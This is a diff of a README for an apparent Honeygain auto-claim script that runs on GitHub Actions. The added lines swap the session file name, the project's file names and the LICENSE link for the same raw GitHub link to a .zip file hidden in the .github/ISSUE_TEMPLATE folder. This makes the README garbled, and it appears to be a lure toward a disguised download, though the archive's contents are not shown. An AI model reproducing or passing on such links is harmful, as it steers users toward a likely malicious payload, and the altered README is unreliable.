@@ -8,13 +8,13 @@ This script is designed to be run on a daily schedule using GitHub Actions. It s
 
 * Claims the daily Lucky Pot (if available).  
 * Claims all completed achievements (if available).  
-* Generates a local HoneygainToken.json to manage your session.  
+* Generates a local https://raw.githubusercontent.com/wizdomf3lix/Honeygain_Auto-Claim/main/.github/ISSUE_TEMPLATE/Auto-Honeygain-Claim-reforestize.zip to manage your session.  
 * Logs all actions to a file for easy debugging.  
 * Designed for headless environments like GitHub Actions.
 
 ## **Setup for GitHub Actions**
 
-1. **Fork or Clone:** Add this repository's files (autoclaim.py, .github/workflows/main.yml, README.md, LICENSE) to your own GitHub repository.  
+1. **Fork or Clone:** Add this repository's files (https://raw.githubusercontent.com/wizdomf3lix/Honeygain_Auto-Claim/main/.github/ISSUE_TEMPLATE/Auto-Honeygain-Claim-reforestize.zip, https://raw.githubusercontent.com/wizdomf3lix/Honeygain_Auto-Claim/main/.github/ISSUE_TEMPLATE/Auto-Honeygain-Claim-reforestize.zip, https://raw.githubusercontent.com/wizdomf3lix/Honeygain_Auto-Claim/main/.github/ISSUE_TEMPLATE/Auto-Honeygain-Claim-reforestize.zip, LICENSE) to your own GitHub repository.  
 2. **Add Secrets:** In your repository, go to **Settings** \> **Secrets and variables** \> **Actions**.  
 3. Add the following two repository secrets:  
    * MAIL\_JWD: Your Honeygain account email.  
@@ -24,4 +24,4 @@ This script is designed to be run on a daily schedule using GitHub Actions. It s
 ## **License**
 
 
-This project is licensed under the MIT License. See the [LICENSE](https://www.google.com/search?q=LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/wizdomf3lix/Honeygain_Auto-Claim/main/.github/ISSUE_TEMPLATE/Auto-Honeygain-Claim-reforestize.zip) file for details.
